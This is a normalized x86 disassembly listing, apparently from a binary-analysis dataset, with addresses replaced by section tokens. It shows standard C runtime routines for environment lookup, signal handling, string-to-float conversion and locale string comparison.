mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_436c6f
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4361ab
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_430be3
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_43632d
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_430d8b
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_42d880
push 0x1
call sub_430d8b
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_430d8b
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_430d2a
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_43632d
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_43636a
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
lea ecx [ edx + esi ]
cmp ecx edx
jb r-xdata
push 0x1
pop eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
pop esi
mov [ edx ] ecx
retn
sub_43638b
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_43636a
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_43636a
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_43636a
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_43636a
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_4363e9
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx esi
add esi esi
mov [ eax ] esi
lea esi [ edi + edi ]
shr ecx 0x1f
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
mov [ eax + 0x4 ] esi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_436417
mov eax [ esp + 0x4 ]
push esi
push edi
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi edx
mov edi ecx
shl esi 0x1f
shr ecx 0x1
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
shr edx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_436444
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
cmp eax edx
push esi
mov [ ebp - 0x4 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
push edi
mov [ ebp + 0x10 ] eax
mov esi 0x8000
mov ecx [ ebx + 0x4 ]
mov eax ecx
shr eax 0x10
mov [ ebx + 0x8 ] eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
add [ ebp - 0x4 ] 0xfff0
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
jmp r-xdata
mov esi ebx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_4363e9
push ebx
call sub_4363e9
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_43638b
push ebx
call sub_4363e9
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
movsx eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_43638b
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
pop edi
mov ax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
push ebx
call sub_4363e9
add [ ebp - 0x4 ] 0xffff
pop ecx
jmp r-xdata
test [ ebx + 0x8 ] esi
jne r-xdata
sub_43650b
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push 0x1
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
push 0x4
pop esi
cmp eax 0xa
je r-xdata
jmp [ eax * 4 + jump_table_4369ac ]
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x10 ] 0x0
mov [ eax ] edi
je r-xdata
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp bl 0x31
mov [ ebp - 0x10 ] edx
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] edx
jne r-xdata
cmp [ rw-data ] edx
mov [ ebp - 0x24 ] edx
jle r-xdata
lea ecx [ edi - 0x2 ]
cmp bl 0x31
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x20 ] edx
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x1
xor esi esi
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_430f15
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
cmp [ rw-data ] edx
jle r-xdata
cmp bl 0x30
jne r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_430f15
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x31
jl r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp bl 0x30
jne r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
dec edi
pop eax
movsx eax bl
lea ecx [ edi - 0x1 ]
sub eax 0x2b
mov [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x28 ]
pop edi
mov [ ecx + 0x6 ] esi
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] dx
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x45 ] 0x5
jl r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
jmp r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
jne r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_430f15
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
dec [ ebp - 0x8 ]
mov bl [ edi ]
inc edi
jmp r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
je r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
dec edi
jmp r-xdata
cmp bl 0x39
jg r-xdata
cmp bl 0x30
jne r-xdata
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov [ ebp - 0x1c ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
test eax eax
je r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
jmp r-xdata
dec eax
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
dec eax
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x45 ]
and [ ebp - 0x28 ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
pop eax
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
mov eax edx
jmp r-xdata
cmp bl 0x2b
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
dec edi
jmp r-xdata
or [ ebp - 0x18 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
push 0x8
jmp r-xdata
mov edi ecx
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push [ ebp - 0x4 ]
push eax
call sub_436444
mov eax [ ebp - 0x1c ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x18 ] ecx
jge r-xdata
dec [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x2
mov [ ebp - 0x28 ] 0x8000
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x2d
je r-xdata
cmp [ rw-data ] edx
jle r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
add eax [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] ecx
jne r-xdata
neg eax
jmp r-xdata
cmp bl 0x43
jle r-xdata
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x24 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x45
jle r-xdata
cmp eax 0x1450
jle r-xdata
sub eax [ ebp + 0x1c ]
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp eax 0xffffebb0
jge r-xdata
mov [ ebp - 0x2c ] 0x1
cmp bl 0x65
jg r-xdata
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_436f3c
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x3e ]
mov esi [ ebp - 0x3a ]
mov eax [ ebp - 0x36 ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub_4369dc
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xcc
mov [ ebp - 0x19 ] 0xcc
mov [ ebp - 0x18 ] 0xcc
mov [ ebp - 0x17 ] 0xcc
mov [ ebp - 0x16 ] 0xcc
mov [ ebp - 0x15 ] 0xcc
mov [ ebp - 0x14 ] 0xcc
mov [ ebp - 0x13 ] 0xcc
mov [ ebp - 0x12 ] 0xfb
mov [ ebp - 0x11 ] 0x3f
mov [ ebp - 0x4 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test dx dx
jne r-xdata
movzx eax dx
mov ecx edi
mov esi eax
shr ecx 0x18
imul eax eax 0x4d10
shr esi 0x8
and [ ebp - 0x10 ] 0x0
push 0x1
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x6 ] dx
imul ecx ecx 0x4d
mov [ ebp - 0xa ] edi
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
sar esi 0x10
mov [ ebp - 0xe ] eax
movsx eax si
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_436f3c
add esp 0xc
cmp [ ebp - 0x6 ] 0x3fff
jb r-xdata
mov eax 0x80000000
mov [ ebx ] 0x1
cmp edi eax
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
test [ ebp + 0x18 ] 0x1
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x1c ]
inc esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_436d1c
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx + 0x5 ] 0x0
push 0x1
pop eax
jmp r-xdata
movzx esi [ ebp - 0x6 ]
sub esi 0x3ffe
and [ ebp - 0x6 ] 0x0
mov [ ebp + 0x1c ] 0x8
push 0x15
pop edi
cmp edi 0x15
jle r-xdata
jmp r-xdata
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_4350c0
pop ecx
mov [ ebx + 0x3 ] 0x6
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_4363e9
dec [ ebp + 0x1c ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea ecx [ edi + 0x1 ]
lea eax [ ebx + 0x4 ]
test ecx ecx
mov [ ebp + 0x1c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
dec eax
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp + 0x14 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_436417
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_4350c0
pop ecx
mov [ ebx + 0x3 ] 0x5
pop ecx
cmp eax ecx
jb r-xdata
cmp eax ecx
jb r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
movsd [ edi ] [ esi ]
call sub_4363e9
lea eax [ ebp - 0x10 ]
push eax
call sub_4363e9
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43638b
lea eax [ ebp - 0x10 ]
push eax
call sub_4363e9
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x1c ]
and [ ebp - 0x5 ] 0x0
add esp 0x14
add al 0x30
inc [ ebp + 0x1c ]
dec [ ebp + 0x14 ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x1c ]
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ecx ] 0x30
cmp [ eax ] 0x30
jne r-xdata
inc eax
inc [ ebx ]
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
dec eax
jmp r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
jmp r-xdata
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
inc [ eax ]
sub_436c6f
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_436fb8
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_436cae
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_42dd9c
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_437260
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_436d1c
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov cx [ ebx + 0xa ]
xor eax eax
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov ax [ esi + 0xa ]
mov edi ecx
mov edx 0x7fff
xor edi eax
and eax edx
and ecx edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
xor eax eax
cmp [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
add [ ebp - 0x4 ] 0x2
inc [ ebp - 0x10 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0x8 ] 0x2
sub [ ebp - 0xc ] 0x2
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x19 ] 0x80
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
imul eax ecx
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_43636a
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x8000
ja r-xdata
movsx eax [ ebp + 0x8 ]
neg eax
add [ ebp + 0x8 ] eax
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4363e9
add [ ebp + 0x8 ] 0xffff
pop ecx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x24 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_436417
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x22 ]
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x24 ] 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov cx [ ebp - 0x22 ]
or eax edi
mov [ esi ] cx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x6 ] ecx
inc [ ebp - 0x1e ]
jmp r-xdata
and [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1a ] 0xffff
jne r-xdata
or [ ebp - 0x24 ] 0x1
inc [ ebp - 0x1a ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1a ] 0x8000
jmp r-xdata
sub_436f3c
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
pop ebx
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov ebx rw-data
neg eax
mov [ ebp + 0xc ] eax
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
cmp [ ebx + eax * 4 ] 0x8000
lea esi [ ebx + eax * 4 ]
jb r-xdata
mov eax [ ebp + 0xc ]
add ebx 0x54
sar [ ebp + 0xc ] 0x3
and eax 0x7
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_436d1c
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xa ]
lea esi [ ebp - 0xc ]
sub_436fb8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_437235
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_437235
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
